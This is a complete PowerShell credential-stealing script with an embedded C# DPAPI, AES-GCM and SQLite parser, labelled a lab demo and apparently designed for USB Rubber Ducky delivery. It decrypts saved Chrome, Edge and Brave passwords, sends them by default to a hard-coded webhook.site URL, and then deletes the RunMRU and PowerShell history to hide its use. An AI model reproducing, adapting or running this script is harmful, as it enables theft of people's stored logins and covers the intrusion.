# =====================================================================
#  extract.ps1  -  LAB-ONLY DEMO (Windows 10/11, PowerShell 5.1)
#  Liest gespeicherte Browser-Passwoerter (Chrome / Edge / Brave):
#    - 'Local State' -> os_crypt.encrypted_key -> DPAPI -> AES-256-GCM-Key
#    - 'Login Data'  -> Mini-SQLite-Parser -> logins-Tabelle -> v10/v11-Blobs
#  Chrome/Edge >= 127 (v20 = App-Bound Encryption) werden nur als solche
#  gemeldet, nicht entschluesselt (siehe README / Enterprise-Policy).
#  NUR im eigenen, isolierten LAB einsetzen!
# =====================================================================
param([string]$ExfilUrl = 'https://webhook.site/d20dc9cd-2743-45e9-8f2b-6016c3b7e30c')

# ----------------------- CONFIG -----------------------
$LabelRegex   = 'DUCK'   # Volume-Label des Ducky-STORAGE (Variante A)
$KillBrowsers = $false   # $true = Browser-Prozesse vorher beenden
$DoCleanup    = $true    # Run-MRU + PSReadLine-History loeschen
#   Optionaler Exfil-POST: beim Aufruf mitgeben, z.B.:
#   extract.ps1 -ExfilUrl http://192.168.1.50:8000/exfil
# -------------------------------------------------------

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue'

$Out = New-Object System.Text.StringBuilder
function Log { param([string]$s) [void]$Out.AppendLine($s) }

Log ('=== LAB Browser-Password-Extraction  ' + (Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + ' ===')
Log ('Host: ' + $env:COMPUTERNAME + ' | User: ' + $env:USERNAME)

$Src = $null
try {
    $vol = Get-Volume | Where-Object { $_.FileSystemLabel -match $LabelRegex } | Select-Object -First 1
    if ($vol) { $Src = ($vol.DriveLetter + ':\extract.ps1') }
} catch {}
Log ('Quelle: ' + $(if ($Src) { $Src } else { 'TEMP - kein DUCKY-Volume gefunden (Variante B/C)' }))

if ($KillBrowsers) {
    Get-Process chrome, msedge, brave -ErrorAction SilentlyContinue | Stop-Process -Force
    Start-Sleep -Milliseconds 800
}

# ---------------- C# (DPAPI + AES-GCM + Mini-SQLite) ----------------
$CS = @'
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;

public static class X
{
    // ----- DPAPI -----
    [StructLayout(LayoutKind.Sequential)]
    public struct DATA_BLOB { public int cbData; public IntPtr pbData; }

    [DllImport("crypt32.dll", SetLastError = true)]
    private static extern bool CryptUnprotectData(ref DATA_BLOB pDataIn, IntPtr ppszDescr, IntPtr pOptionalEntropy, IntPtr pvReserved, IntPtr pPrompt, int dwFlags, ref DATA_BLOB pDataOut);

    public static byte[] DPAPI(byte[] data)
    {
        DATA_BLOB i = new DATA_BLOB();
        DATA_BLOB o = new DATA_BLOB();
        i.cbData = data.Length;
        i.pbData = Marshal.AllocHGlobal(data.Length);
        Marshal.Copy(data, 0, i.pbData, data.Length);
        try
        {
            if (!CryptUnprotectData(ref i, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0, ref o)) return null;
            byte[] r = new byte[o.cbData];
            Marshal.Copy(o.pbData, r, 0, o.cbData);
            return r;
        }
        finally
        {
            Marshal.FreeHGlobal(i.pbData);
            if (o.pbData != IntPtr.Zero) Marshal.FreeHGlobal(o.pbData);
        }
    }

    // ----- AES-256-GCM via CNG/BCrypt -----
    [StructLayout(LayoutKind.Sequential)]
    public struct ACI
    {
        public int cbSize;
        public int dwInfoVersion;
        public IntPtr pbNonce;
        public int cbNonce;
        public IntPtr pbTag;
        public int cbTag;
        public IntPtr pbAuthData;
        public int cbAuthData;
        public IntPtr pbMacContext;
        public int cbMacContext;
        public int dwFlags;
    }

    [DllImport("bcrypt.dll")]
    private static extern int BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId, IntPtr pszImplementation, int dwFlags);
    [DllImport("bcrypt.dll")]
    private static extern int BCryptSetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProp, [MarshalAs(UnmanagedType.LPWStr)] string pbInput, int cbInput, int dwFlags);
    [DllImport("bcrypt.dll")]
    private static extern int BCryptGenerateSymmetricKey(IntPtr hAlgorithm, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject, byte[] pbSecret, int cbSecret, int dwFlags);
    [DllImport("bcrypt.dll")]
    private static extern int BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, ref ACI pPaddingInfo, IntPtr pbIV, int cbIV, byte[] pbOutput, int cbOutput, out int pcbResult, int dwFlags);
    [DllImport("bcrypt.dll")]
    private static extern int BCryptDestroyKey(IntPtr hKey);
    [DllImport("bcrypt.dll")]
    private static extern int BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, int dwFlags);

    public static byte[] AESGCM(byte[] key, byte[] nonce, byte[] ctAndTag)
    {
        if (ctAndTag.Length <= 16) return null;
        byte[] ct = new byte[ctAndTag.Length - 16];
        byte[] tag = new byte[16];
        Array.Copy(ctAndTag, 0, ct, 0, ct.Length);
        Array.Copy(ctAndTag, ctAndTag.Length - 16, tag, 0, 16);

        IntPtr hAlg = IntPtr.Zero;
        IntPtr hKey = IntPtr.Zero;
        IntPtr pNonce = IntPtr.Zero;
        IntPtr pTag = IntPtr.Zero;
        try
        {
            if (BCryptOpenAlgorithmProvider(out hAlg, "AES", IntPtr.Zero, 0) != 0) return null;
            if (BCryptSetProperty(hAlg, "ChainingMode", "ChainingModeGCM", 30, 0) != 0) return null;
            if (BCryptGenerateSymmetricKey(hAlg, out hKey, IntPtr.Zero, 0, key, key.Length, 0) != 0) return null;

            ACI ai = new ACI();
            ai.cbSize = Marshal.SizeOf(typeof(ACI));
            ai.dwInfoVersion = 0;
            pNonce = Marshal.AllocHGlobal(nonce.Length);
            Marshal.Copy(nonce, 0, pNonce, nonce.Length);
            ai.pbNonce = pNonce;
            ai.cbNonce = nonce.Length;
            pTag = Marshal.AllocHGlobal(16);
            Marshal.Copy(tag, 0, pTag, 16);
            ai.pbTag = pTag;
            ai.cbTag = 16;
            ai.pbAuthData = IntPtr.Zero;
            ai.cbAuthData = 0;
            ai.pbMacContext = IntPtr.Zero;
            ai.cbMacContext = 0;
            ai.dwFlags = 0;

            byte[] plain = new byte[ct.Length];
            int done;
            if (BCryptDecrypt(hKey, ct, ct.Length, ref ai, IntPtr.Zero, 0, plain, plain.Length, out done, 0) != 0) return null;
            return plain;
        }
        finally
        {
            if (hKey != IntPtr.Zero) BCryptDestroyKey(hKey);
            if (hAlg != IntPtr.Zero) BCryptCloseAlgorithmProvider(hAlg, 0);
            if (pNonce != IntPtr.Zero) Marshal.FreeHGlobal(pNonce);
            if (pTag != IntPtr.Zero) Marshal.FreeHGlobal(pTag);
        }
    }

    // ----- Blob-Dispatch: v10/v11 AES-GCM, v20 ABE-Marker, legacy DPAPI -----
    public static string DecryptBlob(byte[] blob, byte[] aesKey)
    {
        if (blob != null && blob.Length > 15 && blob[0] == 0x76 && blob[1] == 0x31 && (blob[2] == 0x30 || blob[2] == 0x31))
        {
            if (aesKey == null) return "[v10/v11: kein AES-Schluessel]";
            byte[] nonce = new byte[12];
            Array.Copy(blob, 3, nonce, 0, 12);
            byte[] rest = new byte[blob.Length - 15];
            Array.Copy(blob, 15, rest, 0, rest.Length);
            byte[] p = AESGCM(aesKey, nonce, rest);
            if (p == null) return "[v10/v11: AES-GCM fehlgeschlagen]";
            return Encoding.UTF8.GetString(p);
        }
        if (blob != null && blob.Length > 3 && blob[0] == 0x76 && blob[1] == 0x32 && blob[2] == 0x30)
        {
            return "[v20: App-Bound Encryption aktiv]";
        }
        byte[] lp = DPAPI(blob);
        if (lp == null) return "[legacy-DPAPI fehlgeschlagen]";
        return Encoding.UTF8.GetString(lp);
    }

    // ----- Mini-SQLite-Reader (logins-Tabelle aus 'Login Data') -----
    public static string[] GetLogins(byte[] db, byte[] aesKey)
    {
        List<string> res = new List<string>();
        if (db == null || db.Length < 600) return res.ToArray();
        MiniSQLite s = new MiniSQLite(db);
        int root = -1;
        string sql = null;
        foreach (object[] rec in s.WalkTable(1))
        {
            if (rec.Length < 5) continue;
            string typ = rec[0] as string;
            string nm = rec[1] as string;
            if (typ == "table" && nm == "logins")
            {
                root = Convert.ToInt32(rec[3]);
                sql = rec[4] as string;
                break;
            }
        }
        if (root < 0) return res.ToArray();

        string[] cols = MiniSQLite.ParseColumns(sql);
        int iUser = -1, iPass = -1, iUrl = -1, iAct = -1;
        for (int i = 0; i < cols.Length; i++)
        {
            string c = cols[i].ToLower();
            if (c == "username_value") iUser = i;
            else if (c == "password_value") iPass = i;
            else if (c == "origin_url") iUrl = i;
            else if (c == "action_url") iAct = i;
        }
        if (iUrl < 0) iUrl = iAct;
        if (iPass < 0) return res.ToArray();

        foreach (object[] rec in s.WalkTable(root))
        {
            if (rec.Length <= iPass) continue;
            byte[] blob = rec[iPass] as byte[];
            if (blob == null) continue;
            string user = (iUser >= 0 && iUser < rec.Length && rec[iUser] != null) ? rec[iUser].ToString() : "";
            string url = (iUrl >= 0 && iUrl < rec.Length && rec[iUrl] != null) ? rec[iUrl].ToString() : "";
            res.Add(url + "\t" + user + "\t" + DecryptBlob(blob, aesKey));
        }
        return res.ToArray();
    }
}

public class MiniSQLite
{
    private byte[] db;
    private int ps;
    private int usable;

    public MiniSQLite(byte[] d)
    {
        db = d;
        ps = ((d[16] << 8) | d[17]);
        if (ps == 1) ps = 65536;
        if (ps < 512) ps = 4096;
        usable = ps - d[20];
        if (usable <= 0 || usable > ps) usable = ps;
    }

    public static ushort Be16(byte[] b, int o) { return (ushort)((b[o] << 8) | b[o + 1]); }
    public static uint Be32(byte[] b, int o) { return ((uint)b[o] << 24) | ((uint)b[o + 1] << 16) | ((uint)b[o + 2] << 8) | (uint)b[o + 3]; }

    private long Varint(byte[] b, ref int o)
    {
        ulong r = 0;
        for (int i = 0; i < 8; i++)
        {
            byte c = b[o];
            o++;
            r = (r << 7) | (ulong)(c & 0x7F);
            if ((c & 0x80) == 0) return (long)r;
        }
        r = (r << 8) | (ulong)b[o];
        o++;
        return (long)r;
    }

    public List<object[]> WalkTable(int rootPage)
    {
        List<object[]> rows = new List<object[]>();
        Walk(rootPage, rows);
        return rows;
    }

    private void Walk(int pg, List<object[]> rows)
    {
        if (pg < 1 || (long)pg * ps > db.Length) return;
        int baseOff = (pg == 1) ? 100 : 0;
        int type = db[baseOff];
        int cellCount = Be16(db, baseOff + 3);

        if (type == 5)
        {
            for (int i = 0; i < cellCount; i++)
            {
                int co = Be16(db, baseOff + 12 + 2 * i);
                int child = (int)Be32(db, (pg - 1) * ps + co);
                Walk(child, rows);
            }
            Walk((int)Be32(db, baseOff + 8), rows);
        }
        else if (type == 13)
        {
            for (int i = 0; i < cellCount; i++)
            {
                int co = Be16(db, baseOff + 8 + 2 * i);
                ReadCell((pg - 1) * ps + co, rows);
            }
        }
    }

    private void ReadCell(int cell, List<object[]> rows)
    {
        int o = cell;
        long payloadLen = Varint(db, ref o);
        Varint(db, ref o); // rowid
        long P = payloadLen;
        if (P < 0 || P > 10485760) return;
        int X = usable - 35;
        int local;
        if (P <= X)
        {
            local = (int)P;
        }
        else
        {
            int M = ((usable - 12) * 32 / 255) - 23;
            int K = (int)(M + ((P - M) % (usable - 4)));
            local = (K <= X) ? K : M;
        }
        if (o + local > db.Length) return;
        byte[] payload = new byte[P];
        Array.Copy(db, o, payload, 0, local);
        if (P > local)
        {
            int next = (int)Be32(db, o + local);
            int copied = local;
            while (next > 0 && copied < P && (long)next * ps <= db.Length)
            {
                int pOff = (next - 1) * ps;
                int chunk = usable - 4;
                if (chunk > P - copied) chunk = (int)(P - copied);
                Array.Copy(db, pOff + 4, payload, copied, chunk);
                copied += chunk;
                next = (int)Be32(db, pOff);
            }
        }
        rows.Add(ParseRecord(payload));
    }

    private object[] ParseRecord(byte[] p)
    {
        int o = 0;
        long hdrLen = Varint(p, ref o);
        List<int> types = new List<int>();
        int to = o;
        while (to < hdrLen && to < p.Length)
        {
            types.Add((int)Varint(p, ref to));
        }
        object[] vals = new object[types.Count];
        int vo = (int)hdrLen;
        for (int i = 0; i < types.Count; i++)
        {
            int t = types[i];
            if (vo >= p.Length) { vals[i] = null; continue; }
            if (t == 0) { vals[i] = null; }
            else if (t >= 1 && t <= 6)
            {
                int n = (t == 1) ? 1 : (t == 2) ? 2 : (t == 3) ? 3 : (t == 4) ? 4 : (t == 5) ? 6 : 8;
                if (vo + n > p.Length) { vals[i] = null; continue; }
                long v = (sbyte)p[vo];
                for (int k = 1; k < n; k++) v = (v << 8) | p[vo + k];
                vo += n;
                vals[i] = v;
            }
            else if (t == 7)
            {
                if (vo + 8 > p.Length) { vals[i] = null; continue; }
                byte[] tmp = new byte[8];
                for (int k = 0; k < 8; k++) tmp[7 - k] = p[vo + k];
                vo += 8;
                vals[i] = BitConverter.ToDouble(tmp, 0);
            }
            else if (t == 8) { vals[i] = 0L; }
            else if (t == 9) { vals[i] = 1L; }
            else if (t >= 12 && (t % 2) == 0)
            {
                int n = (t - 12) / 2;
                if (vo + n > p.Length) { vals[i] = null; continue; }
                byte[] b = new byte[n];
                Array.Copy(p, vo, b, 0, n);
                vo += n;
                vals[i] = b;
            }
            else if (t >= 13)
            {
                int n = (t - 13) / 2;
                if (vo + n > p.Length) { vals[i] = null; continue; }
                vals[i] = Encoding.UTF8.GetString(p, vo, n);
                vo += n;
            }
            else { vals[i] = null; }
        }
        return vals;
    }

    public static string[] ParseColumns(string sql)
    {
        List<string> names = new List<string>();
        if (sql == null) return names.ToArray();
        int a = sql.IndexOf('(');
        int b = sql.LastIndexOf(')');
        if (a < 0 || b <= a) return names.ToArray();
        string body = sql.Substring(a + 1, b - a - 1);
        List<string> parts = new List<string>();
        int depth = 0;
        StringBuilder cur = new StringBuilder();
        foreach (char ch in body)
        {
            if (ch == '(') depth++;
            if (ch == ')') depth--;
            if (ch == ',' && depth == 0) { parts.Add(cur.ToString()); cur = new StringBuilder(); }
            else cur.Append(ch);
        }
        parts.Add(cur.ToString());
        char[] sep = new char[] { ' ', '\t', '\r', '\n' };
        foreach (string part in parts)
        {
            string cd = part.Trim();
            if (cd.Length == 0) continue;
            string first = cd.Split(sep, StringSplitOptions.RemoveEmptyEntries)[0];
            string u = first.ToUpperInvariant();
            if (u == "PRIMARY" || u == "UNIQUE" || u == "CHECK" || u == "FOREIGN" || u == "CONSTRAINT") continue;
            names.Add(first.Trim('"', '[', ']', '`'));
        }
        return names.ToArray();
    }
}
'@

try { Add-Type -TypeDefinition $CS } catch { Log ('[!] Add-Type fehlgeschlagen: ' + $_.Exception.Message) }

# ---------------- Browser-Profile abarbeiten ----------------
$T = Join-Path ([IO.Path]::GetTempPath()) ([Guid]::NewGuid().ToString('N'))
New-Item -ItemType Directory -Path $T -Force | Out-Null

$Browsers = @(
    @{ Name = 'Chrome'; Root = "$env:LOCALAPPDATA\Google\Chrome\User Data" },
    @{ Name = 'Edge';   Root = "$env:LOCALAPPDATA\Microsoft\Edge\User Data" },
    @{ Name = 'Brave';  Root = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data" }
)

foreach ($b in $Browsers)
{
    $root = $b['Root']
    if (-not (Test-Path $root)) { continue }
    Log ''
    Log ('### ' + $b['Name'] + ' ###')

    # AES-Key aus 'Local State' (Base64 -> 'DPAPI'-Praefix entfernen -> CryptUnprotectData)
    $aesKey = $null
    $lsPath = Join-Path $root 'Local State'
    if (Test-Path $lsPath)
    {
        $lsC = Join-Path $T 'localstate.json'
        Copy-Item $lsPath $lsC -Force
        try
        {
            $j = Get-Content $lsC -Raw | ConvertFrom-Json
            $b64 = $j.os_crypt.encrypted_key
            $raw = [Convert]::FromBase64String($b64)
            if ($raw.Length -gt 5 -and [Text.Encoding]::ASCII.GetString($raw, 0, 5) -eq 'DPAPI')
            {
                $enc = New-Object byte[] ($raw.Length - 5)
                [Array]::Copy($raw, 5, $enc, 0, $enc.Length)
                $aesKey = [X]::DPAPI($enc)
                if ($aesKey -and $aesKey.Length -eq 32)
                { Log '[+] AES-Schluessel via DPAPI entspuert (32 Byte)' }
                else
                { Log '[-] DPAPI-Entschluesselung des AES-Schluessels fehlgeschlagen' }
            }
            else { Log '[-] encrypted_key ohne DPAPI-Praefix' }
        }
        catch { Log ('[-] Local State: ' + $_.Exception.Message) }
    }
    else { Log '[-] Kein Local State gefunden' }

    # Profile: Default + Profile* (Datei-Kopie umgeht den SQLite-Lock)
    $profiles = Get-ChildItem $root -Directory | Where-Object { $_.Name -eq 'Default' -or $_.Name -like 'Profile*' }
    foreach ($pd in $profiles)
    {
        $ldPath = Join-Path $pd.FullName 'Login Data'
        if (-not (Test-Path $ldPath)) { continue }
        Log ('--- Profil: ' + $pd.Name + ' ---')
        $ldC = Join-Path $T 'logindata.db'
        Copy-Item $ldPath $ldC -Force
        try
        {
            $db = [IO.File]::ReadAllBytes($ldC)
            $rows = [X]::GetLogins($db, $aesKey)
            if ($rows.Length -eq 0) { Log '    (keine Eintraege in der logins-Tabelle)' }
            foreach ($r in $rows) { Log ('    ' + $r) }
        }
        catch { Log ('    [!] Fehler: ' + $_.Exception.Message) }
    }
}

$Report = $Out.ToString()

# ---------------- Optionaler Exfil-POST ----------------
if ($ExfilUrl)
{
    try
    {
        Invoke-RestMethod -Uri $ExfilUrl -Method Post -Body ([Text.Encoding]::UTF8.GetBytes($Report)) -ContentType 'application/octet-stream' -TimeoutSec 10 | Out-Null
    }
    catch {}
}

# ---------------- Cleanup: Run-MRU + PSReadLine-History + Temp ----------------
if ($DoCleanup)
{
    try
    {
        $opt = Get-PSReadlineOption
        if ($opt -and $opt.HistorySavePath -and (Test-Path $opt.HistorySavePath)) { Remove-Item $opt.HistorySavePath -Force }
    } catch {}
    try
    {
        Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
    } catch {}
}
Remove-Item $T -Recurse -Force -ErrorAction SilentlyContinue

Write-Output $Report
